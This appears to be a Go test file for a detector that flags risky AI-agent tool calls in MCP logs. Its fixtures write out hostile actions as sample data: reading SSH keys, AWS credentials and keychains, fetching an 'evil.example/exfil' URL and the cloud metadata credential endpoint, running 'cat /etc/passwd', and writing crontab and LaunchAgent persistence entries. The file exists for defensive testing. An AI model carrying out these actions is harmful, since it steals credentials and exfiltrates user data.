package trace_test

import (
	"testing"
	"time"

	"github.com/aspex-security/aspex/internal/logparse"
	"github.com/aspex-security/aspex/internal/rules"
	"github.com/aspex-security/aspex/internal/trace"
)

func toolCall(tool string, args map[string]string) logparse.Event {
	return logparse.Event{
		Timestamp: time.Date(2026, 6, 25, 14, 0, 0, 0, time.UTC),
		Client:    "cursor",
		Server:    "test-server",
		Event:     logparse.EventToolsCall,
		Tool:      tool,
		Args:      args,
	}
}

func resourceRead(server string, args map[string]string) logparse.Event {
	return logparse.Event{
		Timestamp: time.Date(2026, 6, 25, 14, 0, 0, 0, time.UTC),
		Client:    "cursor",
		Server:    server,
		Event:     logparse.EventResourceRead,
		Args:      args,
	}
}

func errorEvent(server string) logparse.Event {
	return logparse.Event{
		Timestamp: time.Now(),
		Client:    "cursor",
		Server:    server,
		Event:     logparse.EventError,
	}
}

func assertTraceRule(t *testing.T, flagged []trace.FlaggedEvent, ruleID string, minSev rules.Severity) {
	t.Helper()
	for _, fe := range flagged {
		for _, f := range fe.Findings {
			if f.RuleID == ruleID {
				if f.Severity < minSev {
					t.Errorf("rule %s: severity %v < expected %v", ruleID, f.Severity, minSev)
				}
				if f.Mapping == "" {
					t.Errorf("rule %s: mapping field is empty", ruleID)
				}
				return
			}
		}
	}
	t.Errorf("rule %s not found in flagged events", ruleID)
}

func assertNoTraceRule(t *testing.T, flagged []trace.FlaggedEvent, ruleID string) {
	t.Helper()
	for _, fe := range flagged {
		for _, f := range fe.Findings {
			if f.RuleID == ruleID {
				t.Errorf("unexpected rule %s: %s", ruleID, f.Detail)
			}
		}
	}
}

// ---- AT001: Sensitive path --------------------------------------------------

func TestAT001_DotEnv(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/Users/alice/.env"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT001", rules.SeverityHigh)
}

func TestAT001_SSHKey(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/home/user/.ssh/id_rsa"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT001", rules.SeverityHigh)
}

func TestAT001_AWSCredentials(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/Users/user/.aws/credentials"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT001", rules.SeverityHigh)
}

func TestAT001_Kubeconfig(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/home/user/.kube/config"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT001", rules.SeverityHigh)
}

func TestAT001_SafePath_NoFlag(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/Users/alice/project/main.go"})
	assertNoTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT001")
}

// ---- AT002: Outbound network -------------------------------------------------

func TestAT002_OutboundFetch(t *testing.T) {
	ev := toolCall("fetch", map[string]string{"url": "https://evil.example/exfil"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT002", rules.SeverityHigh)
}

func TestAT002_NoURL_NoFlag(t *testing.T) {
	ev := toolCall("fetch", map[string]string{"path": "/local/file"})
	assertNoTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT002")
}

// ---- AT003: Shell exec -------------------------------------------------------

func TestAT003_RunCommand(t *testing.T) {
	ev := toolCall("run_command", map[string]string{"command": "cat /etc/passwd"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT003", rules.SeverityCritical)
}

func TestAT003_Bash(t *testing.T) {
	ev := toolCall("bash", map[string]string{"cmd": "whoami"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT003", rules.SeverityCritical)
}

// ---- AT004: High volume data -------------------------------------------------

func TestAT004_LargeArgs(t *testing.T) {
	bigVal := make([]byte, 15000)
	for i := range bigVal {
		bigVal[i] = 'x'
	}
	ev := toolCall("send_data", map[string]string{"payload": string(bigVal)})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT004", rules.SeverityMedium)
}

// ---- AT005: Unusual hour -----------------------------------------------------

func TestAT005_NightActivity(t *testing.T) {
	ev := logparse.Event{
		Timestamp: time.Date(2026, 6, 25, 2, 30, 0, 0, time.UTC),
		Client:    "cursor",
		Server:    "test",
		Event:     logparse.EventToolsCall,
		Tool:      "read_file",
	}
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT005", rules.SeverityLow)
}

// ---- AT006: Config file modified --------------------------------------------

func TestAT006_BashrcWrite(t *testing.T) {
	ev := toolCall("write_file", map[string]string{"path": "/home/user/.bashrc"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT006", rules.SeverityHigh)
}

// ---- AT007: Cloud metadata --------------------------------------------------

func TestAT007_IMDSAccess(t *testing.T) {
	ev := toolCall("fetch", map[string]string{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT007", rules.SeverityCritical)
}

// ---- AT008: VCS internal access ---------------------------------------------

func TestAT008_GitConfig(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/project/.git/config"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT008", rules.SeverityMedium)
}

// ---- AT009: Package manifest write ------------------------------------------

func TestAT009_PackageJSON(t *testing.T) {
	ev := toolCall("write_file", map[string]string{"path": "/project/package.json"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT009", rules.SeverityHigh)
}

// ---- AT010: Browser/keychain access -----------------------------------------

func TestAT010_GetCookies(t *testing.T) {
	ev := toolCall("get_cookies", map[string]string{})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT010", rules.SeverityCritical)
}

func TestAT010_KeychainPath(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/Users/user/Library/Keychains/login.keychain"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT010", rules.SeverityCritical)
}

// ---- AT011: Error burst -----------------------------------------------------

func TestAT011_ErrorBurst(t *testing.T) {
	var events []logparse.Event
	base := time.Now()
	for i := 0; i < 6; i++ {
		events = append(events, logparse.Event{
			Timestamp: base.Add(time.Duration(i) * 5 * time.Second),
			Client:    "cursor",
			Server:    "test-server",
			Event:     logparse.EventError,
		})
	}
	flagged := trace.AnalyzeEvents(events)
	assertTraceRule(t, flagged, "AT011", rules.SeverityMedium)
}

// ---- AT012: Lateral movement ------------------------------------------------

func TestAT012_OtherUserHome(t *testing.T) {
	ev := toolCall("read_file", map[string]string{"path": "/Users/otheruser/Documents/secret.txt"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT012", rules.SeverityHigh)
}

// ---- AT013: Mass file enumeration -------------------------------------------

func TestAT013_MassEnum(t *testing.T) {
	var events []logparse.Event
	for i := 0; i < 22; i++ {
		events = append(events, logparse.Event{
			Timestamp: time.Now(),
			Client:    "cursor",
			Server:    "fs-mcp",
			Event:     logparse.EventToolsCall,
			Tool:      "list_directory",
			Args:      map[string]string{"path": "/dir" + itoa(i)},
		})
	}
	flagged := trace.AnalyzeEvents(events)
	assertTraceRule(t, flagged, "AT013", rules.SeverityMedium)
}

// ---- AT014: Persistence write -----------------------------------------------

func TestAT014_CrontabWrite(t *testing.T) {
	ev := toolCall("write_file", map[string]string{"path": "/var/spool/cron/crontabs/root"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT014", rules.SeverityCritical)
}

func TestAT014_LaunchAgent(t *testing.T) {
	ev := toolCall("write_file", map[string]string{"path": "/Users/user/Library/LaunchAgents/evil.plist"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT014", rules.SeverityCritical)
}

// ---- AT015: Cross-server data chain -----------------------------------------

func TestAT015_CrossServerChain(t *testing.T) {
	events := []logparse.Event{
		{
			Timestamp: time.Now(),
			Client:    "cursor",
			Server:    "filesystem-mcp",
			Event:     logparse.EventResourceRead,
			Args:      map[string]string{"path": "/project/src"},
		},
		{
			Timestamp: time.Now(),
			Client:    "cursor",
			Server:    "fetch-mcp",
			Event:     logparse.EventToolsCall,
			Tool:      "fetch",
			Args:      map[string]string{"url": "https://external.example.com"},
		},
	}
	assertTraceRule(t, trace.AnalyzeEvents(events), "AT015", rules.SeverityMedium)
}

// ---- AT016: Env var dump ---------------------------------------------------

func TestAT016_GetEnv(t *testing.T) {
	ev := toolCall("get_env", map[string]string{"name": "AWS_SECRET_ACCESS_KEY"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT016", rules.SeverityHigh)
}

// ---- AT017: Database dump --------------------------------------------------

func TestAT017_DumpDatabase(t *testing.T) {
	ev := toolCall("dump_database", map[string]string{})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT017", rules.SeverityHigh)
}

// ---- AT018: Network scan ---------------------------------------------------

func TestAT018_PortScan(t *testing.T) {
	ev := toolCall("port_scan", map[string]string{"target": "192.168.1.0/24"})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT018", rules.SeverityHigh)
}

// ---- AT019: Clipboard read -------------------------------------------------

func TestAT019_ReadClipboard(t *testing.T) {
	ev := toolCall("read_clipboard", map[string]string{})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT019", rules.SeverityMedium)
}

// ---- AT020: Screen capture -------------------------------------------------

func TestAT020_Screenshot(t *testing.T) {
	ev := toolCall("screenshot", map[string]string{})
	assertTraceRule(t, trace.AnalyzeEvents([]logparse.Event{ev}), "AT020", rules.SeverityHigh)
}

// ---- Clean event: no flags -------------------------------------------------

func TestCleanEvent_NoFlags(t *testing.T) {
	ev := toolCall("get_time", map[string]string{"timezone": "UTC"})
	flagged := trace.AnalyzeEvents([]logparse.Event{ev})
	if len(flagged) != 0 {
		t.Errorf("expected no flags for clean event, got %d: %+v", len(flagged), flagged)
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	s := ""
	for n > 0 {
		s = string(rune('0'+n%10)) + s
		n /= 10
	}
	return s
}
